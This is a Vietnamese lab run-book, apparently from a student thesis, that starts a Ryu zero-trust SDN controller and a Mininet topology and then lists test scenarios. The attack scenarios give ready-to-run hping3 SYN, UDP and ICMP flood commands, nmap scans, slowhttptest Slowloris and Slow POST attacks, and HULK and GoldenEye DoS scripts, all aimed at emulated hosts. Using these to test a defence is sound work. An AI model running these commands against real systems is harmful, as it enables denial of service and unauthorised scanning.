

## 1. Khởi Chạy Ryu Controller (Control Plane)
source ~/ryu-env/bin/activate
cd "/home/vuxtrung/KLTN_ver2/Source Code/Controller"
ryu-manager ZTA_controller.py 


## 2. Khởi Chạy Mạng Mô Phỏng Mininet (Data Plane)

cd /home/vuxtrung/KLTN_ver2/Source Code/Mininet
sudo python3 topology_zta.py


## 3. Các Kịch Bản Kiểm Thử 
### Bước chuẩn bị: Khởi chạy dịch vụ Web Server trên các Host đích

mininet> h1 python3 -m http.server 80 &
mininet> h2 python3 -m http.server 80 &


### Kịch bản 1: Truy cập hợp lệ (Benign Traffic)
mininet> h7 while true; do curl -s http://10.0.0.1/ >/dev/null; sleep 0.5; done &

mininet> h7 ab -n 100 -c 10 http://10.0.0.1/

mininet> h7 wget -qO- http://10.0.0.1/

mininet> h7 pkill -9 -P $$


mininet> h7 ping 10.0.0.1


### Kịch bản 2: Tấn công DDoS Flood (TCP SYN / UDP / ICMP)

* **Thực hiện**:
  * Tấn công TCP SYN Flood 
    mininet> h8 hping3 -S -p 80 --flood 10.0.0.1
  * Tấn công UDP Flood:
    mininet> h8 hping3 --udp -p 53 --flood 10.0.0.3
  * Tấn công ICMP Flood:
    mininet> h8 hping3 -1 --flood 10.0.0.1


### Kịch bản 3: Port Scanning
nmap SYN scan
mininet> h8 nmap -sS -p 1-1000 10.0.0.1
nmap UDP
mininet> h8 nmap -sU -p 1-100 10.0.0.1
nmap Connect scan
mininet> h8 nmap -sT -p 1-1000 10.0.0.1





### Kịch bản 4: DoS
Tấn công Slowloris
mininet> h8 slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://10.0.0.1/
Tấn công Slow POST 
mininet> h8 slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u http://10.0.0.1/


HULK DOS
mininet> h8 python3 "/home/vuxtrung/KLTN_ver2/Source Code/Mininet/hulk.py" http://10.0.0.1/


GOLDEN EYE DOS
mininet> h8 python3 "/home/vuxtrung/KLTN_ver2/Source Code/Mininet/goldeneye.py" http://10.0.0.1/ -w 20 -s 100
